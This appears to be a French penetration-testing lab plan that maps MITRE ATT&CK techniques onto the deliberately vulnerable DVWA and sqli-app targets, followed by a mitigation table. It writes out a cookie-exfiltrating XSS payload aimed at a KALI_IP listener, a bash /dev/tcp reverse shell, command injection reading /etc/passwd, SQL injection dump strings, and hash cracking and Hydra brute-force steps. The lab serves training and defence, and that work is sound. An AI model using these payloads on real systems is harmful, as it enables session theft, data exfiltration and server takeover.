# Plan d'attaque — JOUR-01

## 1. Périmètre et objectifs

- **Cibles** : DVWA (`:8088`), sqli-app (`:8083`)
- **Objectif** : Valider 8 techniques ATT&CK sur 2 applications web vulnérables, de la reconnaissance jusqu'à l'impact réel (exfiltration, shell, mots de passe)
- **Référentiel** : MITRE ATT&CK Enterprise v15
- **Durée estimée** : ~5h

---

## 2. Chaîne d'attaque complète (kill chain)

| RECON | INITIAL ACCESS | EXECUTION | CREDENTIAL ACCESS | IMPACT |
|-------|---------------|-----------|-------------------|--------|
| T1046 Scan | T1189 XSS | T1203 CSRF | T1110 Brute Force | Exfiltration base de données |
| | T1190 SQLi | T1059.004 CMDi | T1110.001 Cracking | Shell serveur (prise de contrôle) |
| | | | T1539 Vol cookie | Mots de passe en clair |

| Phase | Tactique MITRE | Techniques | Labs | Impact réel |
|-------|---------------|------------|------|-------------|
| **Reconnaissance** | [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance | [T1046](https://attack.mitre.org/techniques/T1046/) Network Service Scanning | LAB-2 | Surface d'attaque cartographiée |
| **Accès initial** | [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise (XSS), [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App (SQLi) | LAB-3, LAB-4, LAB-6 | Point d'entrée XSS, accès aux données SQL |
| **Exécution** | [TA0002](https://attack.mitre.org/tactics/TA0002/) Execution | [T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution (CSRF), [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell (CMDi) | LAB-3, LAB-5 | Actions non autorisées, shell interactif |
| **Accès aux identifiants** | [TA0006](https://attack.mitre.org/tactics/TA0006/) Credential Access | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force, [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Password Cracking, [T1539](https://attack.mitre.org/techniques/T1539/) Steal Web Session Cookie | LAB-3, LAB-6, LAB-7 | Mots de passe compromis, session usurpable |
| **Impact** | [TA0040](https://attack.mitre.org/tactics/TA0040/) Impact | — | — | Exfiltration DB · Shell serveur · Mots de passe clair |

---

## 3. Plan d'ordonnancement détaillé

### Étape 1 → LAB-2 — Reconnaissance : Scan et énumération

| Propriété | Valeur |
|-----------|--------|
| **Technique ATT&CK** | [T1046](https://attack.mitre.org/techniques/T1046/) Network Service Scanning |
| **Tactique** | [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance |
| **Cible** | `dvwa-target` (port `:8088`) |
| **Durée** | 30 min |

**Outils :** `nmap`, `gobuster`, `curl`

**Déroulement :**
1. Scan nmap pour confirmer le port 8088 ouvert et identifier Apache (détection de version)
2. Gobuster pour découvrir les répertoires `/login.php`, `/vulnerabilities/`, `/config/`, `/setup.php`
3. Connexion à DVWA avec `admin:password` en gérant le token CSRF
4. Passage du niveau de sécurité à `low` pour désactiver les protections

**Risques :**
| Risque | Probabilité | Impact | Mitigation |
|--------|------------|--------|------------|
| Firewall bloque le port 8088 | Faible | Critique | Vérifier `docker compose ps` |
| Cookie de session invalide | Moyenne | Moyen | Réexécuter la séquence de login |
| Directory listing désactivé | Haute | Faible | Gobuster trouve moins de pages mais scan fonctionne |

---

### Étape 2 → LAB-3 — Accès initial : Cross-Site Scripting (XSS)

| Propriété | Valeur |
|-----------|--------|
| **Technique ATT&CK** | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise |
| **Tactique** | [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access |
| **Cible** | `dvwa-target` — pages XSS Reflected et Stored |
| **Durée** | 30 min |

**Outils :** Firefox, `python3`, `curl`

**Déroulement :**
1. **Reflected XSS** : Injecter `<script>alert('XSS fonctionnel')</script>` dans le champ "What's your name?"
2. **Vol de cookie** : Héberger un écouteur sur `:8000`, injecter `<script>new Image().src='http://KALI_IP:8000/?cookie='+document.cookie</script>`
3. **Stored XSS** : Injecter `<script>alert('Stored XSS')</script>` dans le Guestbook (persistant en base de données)

**Risques :**
| Risque | Probabilité | Impact | Mitigation |
|--------|------------|--------|------------|
| CSP bloque le script | Faible | Élevé | DVWA en `low` = pas de CSP |
| Firefox bloque le mixed content | Moyenne | Moyen | Utiliser `http://` et non `https://` |
| Cookie en HttpOnly | Faible | Élevé | DVWA ne définit pas HttpOnly par défaut |

---

### Étape 3 → LAB-4 — Accès initial : Injection SQL (sqlmap)

| Propriété | Valeur |
|-----------|--------|
| **Technique ATT&CK** | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application |
| **Tactique** | [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access |
| **Cible** | `dvwa-target` — page SQLi (`/vulnerabilities/sqli/`) |
| **Durée** | 30 min |

**Outils :** `sqlmap`, `curl`

**Déroulement :**
1. Test manuel : `id=1' OR '1'='1' #` → 5 utilisateurs retournés (au lieu d'1)
2. Sqlmap automatique : dump de la table `users` (colonnes `user`, `password`)
3. Récupération des hashs MD5 (5 utilisateurs : admin, gordonb, 1337, pablo, smithy)

**Risques :**
| Risque | Probabilité | Impact | Mitigation |
|--------|------------|--------|------------|
| WAF ModSecurity bloque les requêtes | Faible (DVWA low) | Élevé | Niveau `security=low` nécessaire |
| Cookie invalide → sqlmap ne trouve rien | Moyenne | Élevé | Vérifier `/tmp/dvwa_cookie.txt` contient `security=low` |

---

### Étape 4 → LAB-5 — Exécution : Command Injection + Reverse Shell

| Propriété | Valeur |
|-----------|--------|
| **Technique ATT&CK** | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |
| **Tactique** | [TA0002](https://attack.mitre.org/tactics/TA0002/) Execution |
| **Cible** | `dvwa-target` — page Command Injection (`/vulnerabilities/exec/`) |
| **Durée** | 30 min |

**Outils :** `netcat` (nc), `bash`, `curl`

**Déroulement :**
1. **Injection basique** : `127.0.0.1; whoami` → confirme `www-data`
2. `127.0.0.1; ls /etc/` → listing de répertoire
3. `127.0.0.1; cat /etc/passwd` → extraction des utilisateurs système
4. **Reverse shell** : trouver l'IP Docker (`ip addr show docker0` → `172.17.0.1`)
5. Lancer nc en écoute sur `:4444`
6. Injecter `127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'` (⚠️ `exec` est nécessaire pour un shell interactif stable)
7. Shell interactif obtenu → `whoami` = `www-data`

**Risques :**
| Risque | Probabilité | Impact | Mitigation |
|--------|------------|--------|------------|
| `disable_functions` coupe `shell_exec` | Faible (DVWA low) | Critique | DVWA par défaut ne désactive pas ces fonctions |
| Mauvaise IP Docker | Moyenne | Critique | Vérifier avec `ip addr show docker0` |
| Firewall bloque la connexion sortante | Moyenne | Critique | Désactiver temporairement avec `sudo ufw disable` ou vérifier la règle |

---

### Étape 5 → LAB-6 — Accès aux identifiants : SQLi avancée + Cracking

| Propriété | Valeur |
|-----------|--------|
| **Techniques ATT&CK** | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App + [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Password Cracking |
| **Tactiques** | [TA0001](https://attack.mitre.org/tactics/TA0001/) Initial Access + [TA0006](https://attack.mitre.org/tactics/TA0006/) Credential Access |
| **Cible** | `sqli-app-target` (port `:8083`) — 3 points d'injection |
| **Durée** | 1h |

**Outils :** `curl`, `sqlmap`, `john`, `hashcat` (optionnel)

**Déroulement :**
1. **Point 1** — Paramètre `?id=` (numeric) : `id=1 OR 1=1` → 6 produits
2. **Point 2** — Login `username` (string) : `admin' --` → bypass mot de passe
3. **Point 3** — Filtre `?filter=` (LIKE) : `%' UNION SELECT 1,username,password,email FROM users --` → tous les utilisateurs
4. **Sqlmap** : énumération des tables (`products`, `users`), des colonnes, dump complet
5. **Cracking** : `john --format=raw-md5` → mots de passe en clair
6. **Flag CTF** : `FLAG{sql_injection_master}` dans colonne `secret_flag` de `products`

**Risques :**
| Risque | Probabilité | Impact | Mitigation |
|--------|------------|--------|------------|
| SQLite non reconnu par sqlmap | Faible | Élevé | sqlmap détecte automatiquement le SGBD |
| Wordlist rockyou non disponible | Moyenne | Moyen | `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
| Trop peu de hashs craqués | Faible | Faible | Au moins 3/6 craqués suffisent pour la preuve |

---

### Étape 6 → LAB-7 — Accès aux identifiants : Brute Force (Hydra)

| Propriété | Valeur |
|-----------|--------|
| **Technique ATT&CK** | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
| **Tactique** | [TA0006](https://attack.mitre.org/tactics/TA0006/) Credential Access |
| **Cible** | `dvwa-target` — formulaire de login (`/login.php`) |
| **Durée** | 45 min |

**Outils :** `hydra`, `curl`

**Déroulement :**
1. Analyse du formulaire : champs `username`, `password`, `Login`
2. Identification du message d'échec : `Login failed`
3. Hydra avec `-l admin` et `rockyou.txt` → `admin:password` trouvé
4. Test multi-logins avec `-L` (liste) et `-F` (stop au premier trouvé)

**Risques :**
| Risque | Probabilité | Impact | Mitigation |
|--------|------------|--------|------------|
| Token CSRF bloque Hydra | Moyenne | Élevé | Attaquer sqli-app (sans CSRF) ou utiliser un script wrapper |
| Account lockout après 3 échecs | Faible | Moyen | fail2ban désactivé par défaut sur DVWA |
| Wordlist trop lente (14M entrées) | Haute | Faible | Laisser tourner, le mot de passe "password" est trouvé rapidement |

---

## 4. Matrice des dépendances entre étapes

```text
Étape 1 (LAB-2) : Reconnaissance
    nmap, gobuster, curl
         |
         v
    [cookie DVWA + security=low]   ← requis par toutes les attaques web
         |
          +---> Étape 2 (LAB-3) : XSS + CSRF
          |         T1189 — Drive-by Compromise
          |         T1203 — Exploitation for Client Execution
          |         T1539 — Steal Web Session Cookie
          |         Dépend de : cookie DVWA (Étape 1)
         |
         +---> Étape 3 (LAB-4) : SQLi (DVWA)
         |         T1190 — Exploit Public-Facing App
         |         Dépend de : cookie DVWA (Étape 1)
         |
         +---> Étape 4 (LAB-5) : CMDi + Reverse Shell
         |         T1059.004 — Unix Shell
         |         Dépend de : cookie DVWA (Étape 1)
         |
         +---> Étape 5 (LAB-6) : SQLi avancée + Cracking
         |         T1190 + T1110.001
         |         Indépendant (cible sqli-app:8083)
         |
         +---> Étape 6 (LAB-7) : Brute Force Hydra
                   T1110 — Brute Force
                   Dépend de : formulaire login (Étape 1)

    Objectifs finaux : Vol de session · Dump de base · Shell
```

---

## 5. Contre-mesures et mitigations associées

| Technique ATT&CK | Risque | Mitigation ATT&CK | Contrôle technique |
|-----------------|--------|-------------------|---------------------|
| [T1046](https://attack.mitre.org/techniques/T1046/) Network Service Scanning | Ports exposés | [M1042](https://attack.mitre.org/mitigations/M1042/) Disable or Remove Feature | Directory listing désactivé (LAB-2), Snort/Suricata, `ufw default deny incoming` |
| [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise (XSS) | Vol de session | [M1013](https://attack.mitre.org/mitigations/M1013/) Application Hardening | `htmlspecialchars()`, CSP, `HttpOnly` |
| [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing App (SQLi) | Exfiltration de base | [M1013](https://attack.mitre.org/mitigations/M1013/) Application Hardening | PDO/bindValue, ModSecurity |
| [T1203](https://attack.mitre.org/techniques/T1203/) Exploitation for Client Execution (CSRF) | Exécution d'actions non autorisées | [M1018](https://attack.mitre.org/mitigations/M1018/) User Account Control | Token CSRF, SameSite cookies |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell (CMDi) | Prise de contrôle | [M1018](https://attack.mitre.org/mitigations/M1018/) User Account Control | `disable_functions` php.ini |
| [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force | Compromission de compte | [M1036](https://attack.mitre.org/mitigations/M1036/) Account Lockout | fail2ban (5 échecs → banni 15 min) |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Password Cracking | Mots de passe en clair | [M1027](https://attack.mitre.org/mitigations/M1027/) Password Policies | bcrypt/argon2, politique de complexité |
| [T1539](https://attack.mitre.org/techniques/T1539/) Steal Web Session Cookie | Vol de session | [M1013](https://attack.mitre.org/mitigations/M1013/) Application Hardening | Cookie `HttpOnly`, `Secure`, SameSite |

---


